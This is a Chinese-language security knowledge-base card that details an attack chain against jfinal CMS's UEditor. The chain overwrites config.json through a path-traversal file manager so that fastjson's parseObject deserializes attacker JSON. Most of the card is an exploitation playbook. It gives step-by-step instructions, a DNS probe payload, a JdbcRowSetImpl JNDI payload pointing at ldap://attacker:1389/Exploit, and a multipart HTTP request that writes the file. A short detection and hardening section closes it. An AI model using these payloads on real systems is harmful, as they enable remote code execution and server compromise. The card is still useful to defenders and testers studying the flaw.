---
id: web-java-deser-fastjson-ueditor-config-json-file-sink
title: UEditor config.json 成为 fastjson 反序列化入口：后台任意文件写覆盖该配置，访问 /ueditor 即触发 parseObject
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-ueditor-config-json-file-sink
aliases:
- ueditor config.json 反序列化
- fastjson 文件型 sink
- 后台文件写 触发 fastjson
- config.json 覆盖 getshell
- JSONObject.parseObject 读文件
tags:
- java
- fastjson
- deserialization
- ueditor
- file-write
- cms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:05:51+08:00'
  notes: 已对照原文核对；ConfigManager.initEnv 读 WEB-INF/classes/config.json 后 JSONObject.parseObject、ActionEnter 入口、Inet4Address dnslog 探测 payload 与原文一致；覆盖配置的写原语已按原文实测（上传 mode=add + Replace file），savefile 保留为组件版本变体；原文未标注 fastjson 受影响区间（pom 仅 1.2.62），未设 affected_versions
---

## 一句话结论

jfinal cms 集成 UEditor 时，`ConfigManager.initEnv()` 会读取 `WEB-INF/classes/config.json` 并交给 `JSONObject.parseObject`（fastjson）解析；这个“文件内容 → parseObject”的调用点把 fastjson 的入口从“HTTP 参数”变成了“磁盘文件”，于是只要先拿到后台任意文件写（如 FileManager 的 `mode=add`+替换），把 `config.json` 覆盖成 `{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}`，再访问 `/ueditor` 触发一次初始化，DNS 即回调——同一 sink 换成 JdbcRowSetImpl/TemplatesImpl 即可升级为 RCE。

## 原理

- **入口在文件解码路径**：`ConfigManager` 的 `configFileName = "config.json"`、`getConfigPath()` 返回 `parentPath + WEB-INF/classes/config.json`，`readFile(getConfigPath())` 读字符串后直接 `JSONObject.parseObject(configContent)`。`JSONObject` 继承 `JSON`，所以这里走的就是 fastjson 的 AutoType 解析。
- **为什么这是“文件型 sink”**：常规 fastjson 漏洞是 `@RequestBody`/`JSON.parseObject(参数)` 从 HTTP body 取 JSON；本条 JSON 来自磁盘文件，攻击者必须**先有能力写该文件**。所以完整链是“任意文件写 → 覆盖配置 → 访问触发端点 → parseObject”，不是单请求反序列化。
- **触发时机**：`initEnv()` 在 `ActionEnter` 构造/每次请求时执行（取决于实现是否缓存），因此覆盖文件后访问一次 `/jfinal_cms/ueditor`（或任何 ueditor action）就会重新读文件并解析。
- **为什么用 `Inet4Address` 先验证**：即使目标 fastjson 关闭了 AutoType，内置 `deserializers` 仍允许 `java.net.Inet4Address`/`Inet6Address`，`MiscCodec` 会把 `val` 交给 `InetAddress.getByName` 发起 DNS 查询（见 [[web-java-deser-fastjson-inetaddress-dns-probe-malformed]]）。用它做无回显探测，既确认“文件生效、解析发生”，又不触发拦截。
- **升级路径**：确认可达后，把 `@type` 换成 `com.sun.rowset.JdbcRowSetImpl`（`dataSourceName` 指向 JNDI/LDAP）+ `autoCommit` 触发，或用 `TemplatesImpl` 写 `_bytecodes`；能否成功取决于 fastjson 版本与目标是否出网/有无可利用 gadget，与“文件写”能力无关。
- **前置条件的耦合**：这一步把两个独立缺陷串成一条链——`FileManager` 的路径未过滤（写任意文件）与 `config.json` 的 fastjson 解析（读文件内容当对象图）。单独看任一都不是 RCE，串起来才是。

## 触发条件

- 应用集成 UEditor 且 `ConfigManager` 以 `JSONObject.parseObject(readFile(config.json))` 形式加载配置（jfinal cms 默认如此）。
- 攻击者能写 `WEB-INF/classes/config.json`（后台文件管理器、模板上传路径穿越、或其它任意文件写原语）。
- fastjson 版本允许 `@type`（含仅内置类的低版本）；或至少允许 `Inet4Address` 做探测。
- 能访问 ueditor 的 action 端点（通常 `/ueditor`，无需登录）。

## 利用步骤

1. 确认 UEditor 存在：访问 `/jfinal_cms/ueditor`（或 `/ueditor/controller.jsp?action=config`），观察是否返回 JSON 配置。
2. 用后台文件管理器把 `config.json` 覆盖为探测 payload：
   `{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}`
   （写文件的原语见 [[web-java-component-filemanager-arbitrary-read-write-path-traversal-jfinal-filter]]：原文是后台文件管理器上传后再点 “Replace file/替换” 覆写；`mode=savefile&path=../classes/config.json&content=<payload>` 是部分组件版本的等价入口）。
3. 访问 `/jfinal_cms/ueditor` 触发 `initEnv` → `parseObject`，在 DNSLog 平台确认回调，证明文件被解析。
4. 换成 RCE payload（示例如下），并准备好 JNDI/LDAP 服务端或本地 gadget 链；注意 `parseObject` 失败会被 catch 吞掉（`this.jsonConfig = null`），所以“页面报错”不代表利用失败，以 DNS/回连为准。
5. 成功后清理 `config.json`（恢复原配置），否则 ueditor 后续请求会持续报错。

## PoC

```json
// 1) 探测：内置类，AutoType 关闭也可能可用
{"@type":"java.net.Inet4Address","val":"probe.xxxx.dnslog.cn"}
```

```json
// 2) 升级：JdbcRowSetImpl 触发 JNDI（需目标可出网 / 有可用 gadget）
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

```http
# 3) 覆盖配置（借后台文件管理器写任意文件）
POST /jfinal_cms/admin/filemanager HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="mode"

add
--X
Content-Disposition: form-data; name="currentpath"

../classes
--X
Content-Disposition: form-data; name="newfile"; filename="config.json"
Content-Type: application/json

{"@type":"java.net.Inet4Address","val":"probe.xxxx.dnslog.cn"}
--X--

# 已存在同名文件时，在文件管理器里点 “Replace file/替换” 覆写（原文做法）

# 4) 触发解析
GET /jfinal_cms/ueditor
```

## 变体与关联

- 变体：任何“读本地 JSON 配置再 parseObject”的组件都是同类文件型 sink（UEditor 的 `config.json`、部分 CMS 的 `setting.json`、插件清单）。
- 变体：若目标连 `Inet4Address` 都被拦（高版本 + safeMode），可先用 `java.net.InetSocketAddress` 畸形 payload 或纯报错探测判断解析是否发生。
- 变体：写文件的落点也可换成 `web.xml`、模板文件、`classes/` 下的 `.properties`，对应“写文件 → 被解析/被加载”的其它消费点（见 [[web-java-deser-fastjson-file-write-to-rce]]）。
- 关联：[[web-java-deser-fastjson-inetaddress-dns-probe-malformed]]（探测 payload 原理）、[[web-java-deser-fastjson-file-write-to-rce]]（写文件升级 RCE 的落地点清单）、[[web-java-component-filemanager-arbitrary-read-write-path-traversal-jfinal-filter]]（本链的前置写原语）。

## 检测与防御

- 修复：不要把外部可写目录里的文件内容当 JSON 反序列化源；UEditor 的 `config.json` 应放在只读目录并校验完整性，或改用安全解析（关闭 AutoType、使用 `JSON.parseObject(content, Config.class)` 的强类型重载）。
- 加固：Web 目录与 `WEB-INF/classes` 对应用进程只读挂载；后台文件管理器禁止写 `WEB-INF`；fastjson 升级到 safeMode 并显式关闭 AutoType。
- 检测：`config.json` 的 mtime/内容变更（完整性基线）；访问日志中 `config.json` 写入后紧跟 `/ueditor` 请求；DNS 外联中出现的 `Inet4Address` 型回连域名；JNDI/LDAP 出站连接。
- 响应：确认任意文件写后按“应用可被 RCE”处置，恢复配置、轮换密钥、排查 `classes/` 与 `WEB-INF` 下是否有新增/篡改文件。
